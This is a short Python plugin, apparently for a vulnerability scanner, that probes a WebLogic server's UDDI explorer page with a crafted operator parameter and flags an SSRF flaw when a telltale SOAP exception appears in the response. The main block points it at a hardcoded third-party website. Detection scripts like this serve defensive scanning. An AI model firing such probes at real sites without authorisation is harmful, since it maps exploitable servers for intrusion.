#!/usr/bin/env python
import re

def assign(service, arg):
    if service == "weblogic":
        return True, arg

def audit(arg):
    url = arg+'uddiexplorer/SearchPublicRegistries.jsp?operator=operator=10.301.0.0:80&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Businesslocation&btnSubmit=Search'
    code, head, res, errcode, _ = curl.curl2(url)
    # print res
    if code == 200 and 'weblogic.uddi.client.structures.exception.XML_SoapException: no protocol: operator=10.301.0.0:80' in res:
        security_warning(arg + ' has weblogic SSRF. ')

if __name__ == '__main__':
    from dummy import *
    audit(assign('weblogic', 'http://www.tygjj.com/')[1])